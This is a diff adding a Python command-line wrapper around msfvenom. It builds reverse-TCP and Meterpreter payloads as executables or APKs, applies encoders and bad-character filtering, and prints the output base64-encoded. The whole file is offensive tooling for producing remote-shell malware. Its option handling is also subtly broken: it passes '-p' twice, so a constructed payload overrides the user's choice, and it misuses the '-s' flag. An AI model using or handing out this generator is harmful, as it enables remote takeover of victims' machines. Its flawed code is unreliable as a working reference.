@@ -1,0 +1,45 @@
+import subprocess
+import argparse
+import base64
+
+# Set up argument parser
+parser = argparse.ArgumentParser(description='MSFvenom payload generator')
+parser.add_argument('payload', help='Payload type (e.g. windows/meterpreter/reverse_tcp)')
+parser.add_argument('lhost', help='Local host IP')
+parser.add_argument('lport', help='Local port number')
+parser.add_argument('--encoder', default='cmd/echo', help='Encoder to use')
+parser.add_argument('--format', default='exe', help='Output format (e.g. exe, apk)')
+parser.add_argument('--platform', default='windows', help='Target platform')
+parser.add_argument('--arch', default='x86', help='Target architecture')
+parser.add_argument('--bad-chars', help='Bad characters to exclude')
+parser.add_argument('--space', default=False, action='store_true', help='Replace bad characters with spaces')
+parser.add_argument('--iteration', default=1, help='Number of iterations for encoding')
+
+# Parse arguments
+args = parser.parse_args()
+
+# Build msfvenom command
+command = ['msfvenom', '-p', args.payload, f'LHOST={args.lhost}', f'LPORT={args.lport}', '-f', args.format, '-p', args.platform+'/'+args.arch+'/reverse_tcp', '-e', args.encoder]
+
+# Add bad characters and iterations
+if args.bad_chars:
+    command += ['-b', args.bad_chars]
+if args.space:
+    command += ['-s', ' ']
+if int(args.iteration) > 1:
+    command += ['-i', args.iteration]
+
+# Add output file name
+output_file = f'{args.payload}_{args.lhost}_{args.lport}.{args.format}'
+command += ['-o', output_file]
+
+# Run msfvenom
+subprocess.run(command)
+
+# Print base64 encoded payload
+with open(output_file, 'rb') as f:
+    payload = f.read()
+    encoded_payload = base64.b64encode(payload).decode()
+    print(f'Payload output to file: {output_file}')
+    print(f'Base64 encoded payload:\n{encoded_payload}')
+    
